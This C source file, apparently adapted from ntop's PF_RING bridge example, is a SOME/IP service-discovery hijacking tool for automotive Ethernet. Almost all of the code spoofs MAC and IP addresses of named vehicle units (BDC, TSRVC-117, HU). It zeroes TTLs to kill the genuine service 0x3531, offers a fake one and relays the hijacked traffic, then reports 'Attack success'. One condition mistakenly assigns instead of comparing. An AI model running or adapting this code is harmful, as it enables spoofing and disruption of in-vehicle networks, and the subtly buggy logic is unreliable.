/*
 * (C) 2003-23 - ntop 
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#define _GNU_SOURCE
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <poll.h>
#include <sys/time.h>
#include <time.h>
#include <sys/socket.h>

#include "pfring.h"
#include "pfutils.c"

#define MAX_PKT_LEN 1536

u_int32_t num_sent = 0;
u_char fakeBuf[MAX_PKT_LEN];

double start=0; 


/* ****************************************************** */

void printHelp(void) {
  printf("pfProtoList - Forwards traffic from -a -> -b device using vanilla PF_RING\n\n");
  printf("-h              [Print help]\n");
  printf("-v              [Verbose]\n");
  printf("-p              [Use pfring_send() instead of bridge]\n");
  printf("-a <device>     [First device name]\n");
  printf("-b <device>     [Second device name]\n");
  printf("-g <core_id>    Bind this app to a core\n");
  printf("-w <watermark>  Watermark\n");
}

/* ******************************** */

void my_sigalarm(int sig) {
  char buf[32];

  pfring_format_numbers((double)num_sent, buf, sizeof(buf), 0),
  printf("%s pps\n", buf);
  num_sent = 0;
  alarm(1);
  signal(SIGALRM, my_sigalarm);
}

/* ******************************** */

u_int pktBytes(u_char *pkt, int startIdx, int numBytes) {
  int stopIdx = startIdx + numBytes-1;
  u_int data = pkt[startIdx];
  int i;

  for (i = startIdx; i < stopIdx; ++i)
  {
      data = pkt[i+1] + (data << 8);
  }
  return(data);
}

/* check for the SomeIP service (0x3531) */
int svcAttk(u_char *rcv_pkt, u_int pkt_len) {
  u_int ubytes, ubytes1, payload_size=0, serviceID, methodID, pSize, msgType;
  u_int eSize, eType, eService, eInstance, eVersion, eType_ptr, eTTL, eTTL_ptr;
  u_int opcode, srcID, destID;
  int byte_ptr, serviceIdx, serviceID_ptr, entry_ptr;
  int txAttk = -1, tecm_offset = 0x2a, fuzzByteIdx;

  memcpy(&fakeBuf[0], &rcv_pkt[0], pkt_len);
  byte_ptr = 0x10;                          
  ubytes = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
  switch(ubytes)
  {
    case 0x0800:                                                    // IPV4
      /* looking for SomeIP and SomeIP-SD service (0x3531) */
      byte_ptr = 0x1b;
      if (rcv_pkt[byte_ptr]==0x11) {                                // UDP
        byte_ptr = 0x21;                         
        srcID = rcv_pkt[byte_ptr];                                  // src address ID
        byte_ptr += 4;                          
        destID = rcv_pkt[byte_ptr];                                 // dest address ID
        byte_ptr += 1;                          
        ubytes = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);         // src port
        byte_ptr += 2;                          
        ubytes1 = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);        // dst port
        byte_ptr += 2;                          
        payload_size = pktBytes((u_char *) rcv_pkt, byte_ptr, 2) - 8;

        if (ubytes==30490 || ubytes==30491 || ubytes==30500 || ubytes==30501 || ubytes1==30490 || ubytes1==30491 || \
          ubytes1==30500 || ubytes1==30501) {                       // port 30490, 30491, 30500 or 30501 => SOME/IP
          byte_ptr += 4;    
          serviceIdx = byte_ptr;                      
          serviceID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
          byte_ptr += 2;                          
          methodID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
          byte_ptr += 2;                          
          pSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
          byte_ptr += 10;
          msgType = rcv_pkt[byte_ptr];

          serviceID_ptr = 0;
          while (serviceID_ptr < payload_size) {
            if (serviceID==0xffff && methodID==0x8100) {              // SomeIP-SD
              byte_ptr += 6;                          
              eSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
              byte_ptr += 4;
              printf("SOME/IP-SD, Size: %i\n", eSize);
              entry_ptr = 0;
              while (entry_ptr < eSize) {
                eType = rcv_pkt[byte_ptr];
                eType_ptr = byte_ptr;
                byte_ptr += 4;
                eService = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;
                eInstance = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;
                eVersion = rcv_pkt[byte_ptr];
                byte_ptr += 1;
                eTTL = pktBytes((u_char *) rcv_pkt, byte_ptr, 3);
                eTTL_ptr = byte_ptr+2;
                printf("  eType: %i, eService: %x, eInstance: %x, eVersion: %i, eTTL: %i\n", eType, eService, eInstance, eVersion, eTTL);

                if ((srcID==0x10)&&(eService==0x3531)&&(eType==0x01)) {     
                  /* found offered service 0x3531 from BDC */
                  printf ("Received Offered service 0x3531 from BDC =======================================================\n");
                  rcv_pkt[eTTL_ptr] = 0x0;              // Stop the service 0x3531
                  txAttk = 0;
                }

                if ((srcID==0x73)&&(eService==0x3531)&&(eType==0x0)) {     
                  // found "find service 0x3531" from TSRVC-117
                  printf ("Received Find service 0x3531 from TSRVC-117 =======================================================\n");
                  fakeBuf[eType_ptr] = 0x01;          // change to offer service eType
                  fakeBuf[eTTL_ptr] = 0x03;           // change to offer
                  rcv_pkt[eType_ptr] = 0x01;          // change to offer service eType
                  rcv_pkt[eTTL_ptr] = 0x0;            // Stop the service 0x3531
                  txAttk = 1;
                }

                if ((srcID==0x75) && (destID==0x63) && (eType==0x06) && (eTTL!=0x0)) {
                  // found subscribed service 0x3531 from TSRVC-117 to HU
                  printf ("Received subscribed service 0x3531 from TSRVC-117 to HU =======================================================\n");
                  txAttk = 2;
                }

                if ((srcID==0x10) && (destID==0x63) && (eType==0x07) && (eTTL!=0x0)) {
                  // found subscribed ack services from BDC to HU
                  printf ("Received subscribed ack service 0x3531 from BDC to HU =======================================================\n");
                  txAttk = 3;
                }

                if ((srcID==0x75) && (destID==0x63) && (eType==0x06) && (eTTL=0x0)) {
                  // found stop subscribed service 0x3531 from TSRVC-117 to HU
                  printf ("Received stop subscribed service 0x3531 from TSRVC-117 to HU =======================================================\n");
                  txAttk = 4;
                }
                byte_ptr += 7;
                entry_ptr = entry_ptr + 16;
                }                    
            }
            else if (serviceID==0x3531) {
              /* Received service 0x3531 from BDC */
              printf ("Received service 0x3531 from BDC =======================================================\n");
              txAttk = 99;
            }

            serviceID_ptr += pSize+8;
            if (serviceID_ptr<payload_size) {
                byte_ptr = serviceIdx + serviceID_ptr;
                serviceID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;                          
                methodID = pktBytes((u_char *) rcv_pkt, byte_ptr, 2);
                byte_ptr += 2;                          
                pSize = pktBytes((u_char *) rcv_pkt, byte_ptr, 4);
                byte_ptr += 10;
                msgType = rcv_pkt[byte_ptr];
            }
          }
        }
      }
      break;

    // others
    default:
      break;
  }
  return(txAttk);
}

/* ****************************************************** */

int main(int argc, char* argv[]) {
  pfring *a_ring, *b_ring, *attk_ring;
  char *a_dev = NULL, *b_dev = NULL, c;
  u_int8_t verbose = 0, use_pfring_send = 0;
  int a_ifindex, b_ifindex, attk_ifindex;
  int bind_core = -1;
  u_int16_t watermark = 1;
  char *bpfFilter = NULL;
  int firstTime=1, bufSize;
  struct timespec startClk;

  while((c = getopt(argc,argv, "ha:b:c:f:vpg:w:")) != -1) {
    switch(c) {
      case 'h':
        printHelp();
        return 0;
        break;
      case 'a':
        a_dev = strdup(optarg);
        break;
      case 'b':
        b_dev = strdup(optarg);
        break;
      case 'f':
        bpfFilter = strdup(optarg);
        break;
      case 'p':
        use_pfring_send = 1;
        break;
      case 'v':
        verbose = 1;
        break;
      case 'g':
        bind_core = atoi(optarg);
        break;
      case 'w':
        watermark = atoi(optarg);
        break;
    }
  }  

  if ((!a_dev) || (!b_dev)) {
    printf("You must specify two devices!\n");
    return -1;
  }

  if(strcmp(a_dev, b_dev) == 0) {
    printf("Bridge devices must be different!\n");
    return -1;
  }

  /* Device A */
  if((a_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC |
                 PF_RING_LONG_HEADER |
                 PF_RING_DISCARD_INJECTED_PKTS |
                 (use_pfring_send ? 0 : PF_RING_RX_PACKET_BOUNCE))
    ) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    return(-1);
  }

  pfring_set_application_name(a_ring, "pfbridge-a");
  pfring_set_direction(a_ring, rx_only_direction);
  pfring_set_socket_mode(a_ring, recv_only_mode);
  pfring_set_poll_watermark(a_ring, watermark);
  pfring_get_bound_device_ifindex(a_ring, &a_ifindex);

  /* Adding BPF filter */
  if(bpfFilter != NULL) {
    int rc = pfring_set_bpf_filter(a_ring, bpfFilter);
    if(rc != 0)
      printf("pfring_set_bpf_filter(%s) returned %d\n", bpfFilter, rc);
    else
      printf("Successfully set BPF filter '%s'\n", bpfFilter);
  }

  /* Device B */

  if((b_ring = pfring_open(b_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", b_dev, strerror(errno));
    pfring_close(a_ring);
    return(-1);
  }

  pfring_set_application_name(b_ring, "pfbridge-b");
  pfring_set_socket_mode(b_ring, send_only_mode);
  pfring_get_bound_device_ifindex(b_ring, &b_ifindex);
  
  /* Attack ring */

  if((attk_ring = pfring_open(a_dev, MAX_PKT_LEN, 
                 PF_RING_PROMISC | 
                 PF_RING_LONG_HEADER)) == NULL) {
    printf("pfring_open error for %s [%s]\n", a_dev, strerror(errno));
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  pfring_set_application_name(attk_ring, "pfSvcAttk-a");
  pfring_set_socket_mode(attk_ring, send_only_mode);
  pfring_get_bound_device_ifindex(attk_ring, &attk_ifindex);
  
  /* Enable Sockets */

  if (pfring_enable_ring(a_ring) != 0) {
    printf("Unable enabling ring 'a' :-(\n");
    pfring_close(a_ring);
    pfring_close(b_ring);
    return(-1);
  }

  if(use_pfring_send) {
    if (pfring_enable_ring(b_ring)) {
      printf("Unable enabling ring 'b' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
    if (pfring_enable_ring(attk_ring)) {
      printf("Unable enabling ring 'attk' :-(\n");
      pfring_close(a_ring);
      pfring_close(b_ring);
      pfring_close(attk_ring);
      return(-1);
    }
  } else {
    pfring_close(b_ring);
  }
  
  signal(SIGALRM, my_sigalarm);
  alarm(1);

  if(bind_core >= 0)
    bind2core(bind_core);
 
  while(1) {
    u_char *buffer;
    struct pfring_pkthdr hdr;
    int attk=-1;
    
    if(pfring_recv(a_ring, &buffer, 0, &hdr, 1) > 0) {
      int rc;
      
      if(use_pfring_send) {

        if (firstTime==1) {
          clock_gettime(CLOCK_REALTIME, &startClk);
          start = startClk.tv_sec + (startClk.tv_nsec/1000000000.0);
          firstTime = 0;
        } 
        attk = svcAttk((u_char *) buffer, hdr.caplen);
        if (attk==2) {
          /* attk=2 - Relay subscribed service 0x3531 from TSRVC-117 to BDC */
          printf ("Relay subscribed service 0x3531 from TSRVC-117 to BDC =======================================================\n");
          buffer[0x0] = 0xd8;                        // Dest MAC address (BDC)
          buffer[0x1] = 0x18;
          buffer[0x2] = 0x2b;
          buffer[0x3] = 0x80;
          buffer[0x4] = 0xae;
          buffer[0x5] = 0xf5;
          buffer[0x6] = 0x28;                        // Src MAC address (HU)
          buffer[0x7] = 0x56;
          buffer[0x8] = 0xc1;
          buffer[0x9] = 0xbb;
          buffer[0xa] = 0x8a;
          buffer[0xb] = 0x0d;
          buffer[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
          buffer[0x1f] = 0x30;
          buffer[0x20] = 0xc7;
          buffer[0x21] = 0x63;
          buffer[0x22] = 0xa0;                       // Dest IP = 160.48.199.16
          buffer[0x23] = 0x30;
          buffer[0x24] = 0xc7;
          buffer[0x25] = 0x10;
          bufSize = hdr.caplen;
          buffer[bufSize-5] = 0x63;                  // endpoint = 160.48.199.99
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
        else if (attk==3) {
          /* attk=3 - Relay subscribed ack service 0x3531 from BDC to TSRVC-117 */
          printf ("Relay subscribed ack service 0x3531 from BDC to TSRVC-117 =======================================================\n");
          buffer[0x0] = 0xbc;                        // Dest MAC address (TSRVC-117)
          buffer[0x1] = 0x90;
          buffer[0x2] = 0x3a;
          buffer[0x3] = 0xd9;
          buffer[0x4] = 0xa9;
          buffer[0x5] = 0x82;
          buffer[0x6] = 0x28;                        // Src MAC address (HU)
          buffer[0x7] = 0x56;
          buffer[0x8] = 0xc1;
          buffer[0x9] = 0xbb;
          buffer[0xa] = 0x8a;
          buffer[0xb] = 0x0d;
          buffer[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
          buffer[0x1f] = 0x30;
          buffer[0x20] = 0xc7;
          buffer[0x21] = 0x63;
          buffer[0x22] = 0xa0;                       // Dest IP = 160.48.199.117
          buffer[0x23] = 0x30;
          buffer[0x24] = 0xc7;
          buffer[0x25] = 0x75;
          bufSize = hdr.caplen;
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);        
        }
        else if (attk==4) {
          /* attk=4 - Relay stop subscribed service 0x3531 from TSRVC-117 to BDC */
          printf ("Relay stop subscribed service 0x3531 from TSRVC-117 to BDC =======================================================\n");
          buffer[0x0] = 0xd8;                        // Dest MAC address (BDC)
          buffer[0x1] = 0x18;
          buffer[0x2] = 0x2b;
          buffer[0x3] = 0x80;
          buffer[0x4] = 0xae;
          buffer[0x5] = 0xf5;
          buffer[0x6] = 0x28;                        // Src MAC address (HU)
          buffer[0x7] = 0x56;
          buffer[0x8] = 0xc1;
          buffer[0x9] = 0xbb;
          buffer[0xa] = 0x8a;
          buffer[0xb] = 0x0d;
          buffer[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
          buffer[0x1f] = 0x30;
          buffer[0x20] = 0xc7;
          buffer[0x21] = 0x63;
          buffer[0x22] = 0xa0;                       // Dest IP = 160.48.199.16
          buffer[0x23] = 0x30;
          buffer[0x24] = 0xc7;
          buffer[0x25] = 0x10;
          bufSize = hdr.caplen;
          buffer[bufSize-5] = 0x63;                  // endpoint = 160.48.199.99
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
        else if (attk==99) {
          /* attk=99 - Relay SomeIP service 0x3531, i.e. hijacked service from BDC to TSRVC is successful */
          printf ("Attack success: Relay service 0x3531 to TSRVC-117 =======================================================\n");
          buffer[0x0] = 0xbc;                        // Dest MAC address (TSRVC-117)
          buffer[0x1] = 0x90;
          buffer[0x2] = 0x3a;
          buffer[0x3] = 0xd9;
          buffer[0x4] = 0xa9;
          buffer[0x5] = 0x82;
          buffer[0x6] = 0x28;                        // Src MAC address (HU)
          buffer[0x7] = 0x56;
          buffer[0x8] = 0xc1;
          buffer[0x9] = 0xbb;
          buffer[0xa] = 0x8a;
          buffer[0xb] = 0x0d;
          buffer[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
          buffer[0x1f] = 0x30;
          buffer[0x20] = 0xc7;
          buffer[0x21] = 0x63;
          buffer[0x22] = 0xa0;                       // Dest IP = 160.48.199.117
          buffer[0x23] = 0x30;
          buffer[0x24] = 0xc7;
          buffer[0x25] = 0x75;
          bufSize = hdr.caplen;
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1);          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
        else {
          rc = pfring_send(b_ring, (char *) buffer, hdr.caplen, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", hdr.caplen, pfring_get_mtu_size(b_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", hdr.len);
        }

        if (attk==0) {                              
          /* attk=0 - Found offer service 0x3531 from BDC */
          bufSize = hdr.caplen;
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1); // Fake stop offer service 0x3531 from BDC
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);

          /* Offer fake service from HU */
          fakeBuf[0x6] = 0x28;                        // Src MAC address (HU)
          fakeBuf[0x7] = 0x56;
          fakeBuf[0x8] = 0xc1;
          fakeBuf[0x9] = 0xbb;
          fakeBuf[0xa] = 0x8a;
          fakeBuf[0xb] = 0x0d;
          fakeBuf[0x1e] = 0xa0;                       // Src IP = 160.48.199.99
          fakeBuf[0x1f] = 0x30;
          fakeBuf[0x20] = 0xc7;
          fakeBuf[0x21] = 0x63;
          bufSize = hdr.caplen;
          fakeBuf[bufSize-5] = 0x63;                  // endpoint = 160.48.199.99
          rc = pfring_send(attk_ring, (char *) fakeBuf, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }

        else if (attk==1) {                              
          /* attk=1 - Found "find service 0x3531" from TSRVC-117 */
          buffer[0x6] = 0xd8;                        // Src MAC address (fake BDC)
          buffer[0x7] = 0x18;
          buffer[0x8] = 0x2b;
          buffer[0x9] = 0x80;
          buffer[0xa] = 0xae;
          buffer[0xb] = 0xf5;
          buffer[0x1e] = 0xa0;                       // Src IP = 160.48.199.16 (fake BDC)
          buffer[0x1f] = 0x30;
          buffer[0x20] = 0xc7;
          buffer[0x21] = 0x10;
          bufSize = hdr.caplen;
          buffer[bufSize-5] = 0x10;                  // endpoint = 160.48.199.16
          rc = pfring_send(attk_ring, (char *) buffer, bufSize, 1); // Fake stop offer service 0x3531 from BDC
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);

          /* Offer fake service from HU */
          fakeBuf[0x6] = 0x28;                        // Src MAC address (HU)
          fakeBuf[0x7] = 0x56;
          fakeBuf[0x8] = 0xc1;
          fakeBuf[0x9] = 0xbb;
          fakeBuf[0xa] = 0x8a;
          fakeBuf[0xb] = 0x0d;
          fakeBuf[0x1e] = 0xa0;                       // Src IP = 160.48.199.99 (fake BDC IP address)
          fakeBuf[0x1f] = 0x30;
          fakeBuf[0x20] = 0xc7;
          fakeBuf[0x21] = 0x63;
          bufSize = hdr.caplen;
          fakeBuf[bufSize-5] = 99;                    // endpoint = 160.48.199.99
          rc = pfring_send(attk_ring, (char *) fakeBuf, bufSize, 1);
          if(rc < 0)
            printf("pfring_send(caplen=%u <= l2+mtu(%u)?) error %d\n", bufSize, pfring_get_mtu_size(attk_ring), rc);
          else if(verbose)
            printf("Forwarded %d bytes packet\n", bufSize);
        }
      }
      else {
        rc = pfring_send_last_rx_packet(a_ring, b_ifindex);
	
	      if(rc < 0)
	        printf("pfring_send_last_rx_packet() error %d\n", rc);
	      else if(verbose)
	        printf("Forwarded %d bytes packet\n", hdr.len);
      }

      if(rc >= 0) num_sent++;
    }
  }

  pfring_close(a_ring);
  if(use_pfring_send) pfring_close(b_ring);
  
  return(0);
}
